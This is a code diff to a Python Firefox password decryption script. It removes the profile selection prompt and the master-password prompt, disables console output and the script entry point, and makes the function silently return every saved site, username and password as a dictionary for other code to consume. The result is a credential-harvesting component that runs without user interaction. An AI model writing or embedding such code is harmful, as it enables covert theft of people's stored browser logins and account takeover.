@@ -104,6 +104,8 @@ def decrypt_passwords(profile, password):
     Decrypt requested profile using the provided password and print out all
     stored passwords.
     """
+    libnss = CDLL("libnss3.so")
+    output = {} 
 
     if libnss.NSS_Init(profile) != 0:
         err.write("Error - Couldn't initialize NSS\n")
@@ -155,12 +157,15 @@ def decrypt_passwords(profile, password):
             # This shouldn't really happen but failsafe just in case
             err.write("Error - Given Master Password is not correct!\n")
             return 9
-
+        """
         out.write("Website:   {0}\n".format(host.encode("utf-8")))
         out.write("Username: '{0}'\n".format(string_at(outuser.data,
                                                        outuser.len)))
         out.write("Password: '{0}'\n\n".format(string_at(outpass.data,
                                                          outpass.len)))
+        """
+        output[(host.encode("utf-8"))] = [(string_at(outuser.data,outuser.len)),
+                                                  (string_at(outpass.data,outpass.len))]
 
     credentials.done()
     libnss.NSS_Shutdown()
@@ -168,7 +173,7 @@ def decrypt_passwords(profile, password):
     if not got_password:
         err.write("Warning - No passwords found in selected profile\n")
 
-    return 0
+    return output
 
 
 def ask_section(profiles):
@@ -184,26 +189,30 @@ def ask_section(profiles):
             continue
         i += 1
 
+    
     choice = None
+    """
     while choice not in sections:
         err.write("Select the Firefox profile you wish to decrypt\n")
         for i in sorted(sections):
             err.write("{0} -> {1}\n".format(i, sections[i]))
         err.flush()
-        choice = raw_input("Choice: ")
+        choice = raw_input("Choice: ") 
+    """
+    return sections[str(1)]
 
-    return sections[choice]
 
 
 def ask_password(profile):
     """
     Prompt for profile password
     """
+    return ""
     passmsg = "\nMaster Password for profile {}: ".format(profile)
     return getpass(passmsg)
 
 
-def main():
+def get_information():
     profile_path = "~/.mozilla/firefox/"
 
     if len(sys.argv) > 2:
@@ -236,7 +245,11 @@ def main():
     # And finally decode all passwords
     out = decrypt_passwords(profile, password)
 
-    sys.exit(out)
+    # sys.exit(out)
+
+    return  out
+
+"""
 
 if __name__ == "__main__":
     try:
@@ -248,3 +261,4 @@ if __name__ == "__main__":
         sys.exit(3)
 
     main()
+"""
